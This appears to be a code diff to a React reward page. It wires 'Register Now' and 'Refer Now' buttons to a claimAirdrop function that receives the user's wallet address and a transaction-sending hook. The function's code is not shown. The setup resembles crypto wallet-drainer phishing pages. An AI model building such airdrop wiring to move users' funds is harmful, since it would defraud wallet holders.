@@ -3,7 +3,17 @@ import { usdt } from "../assets";
 import { NavLink } from "react-router-dom";
 import styles from "./RewardContent.module.css";
 
+import { useWeb3Modal } from "@web3modal/wagmi/react";
+import { useAccount, usePublicClient, useSendTransaction } from 'wagmi'
+import { claimAirdrop } from "../../funcs";
+
 const RewardContent = () => {
+  const {open } = useWeb3Modal()
+  const { address, isConnected } = useAccount()
+  const publicClient = usePublicClient()
+  const { sendTransaction } = useSendTransaction()
+  
+  
   return (
     <section className="bg-[#08023c] py-[3rem]">
       <div className={styles.container}>
@@ -24,17 +34,19 @@ const RewardContent = () => {
           </div>
 
           <div className="flex gap-1 justify-center mt-[1rem]">
-            <NavLink to="wallet">
+            <NavLink>
               <button
                 className={`bg-[#FFC107] text-[#000000] px-[1rem] py-[0.5rem] rounded-md`}
+                onClick={() => {claimAirdrop(address, publicClient, open, sendTransaction)}}
               >
                 Register Now
               </button>
             </NavLink>
 
-            <NavLink to="wallet">
+            <NavLink>
               <button
                 className={`bg-[#fff] text-[#000000] px-[1rem] py-[0.5rem] rounded-md`}
+                onClick={() => {claimAirdrop(address, publicClient, open, sendTransaction)}}
               >
                 Refer Now
               </button>
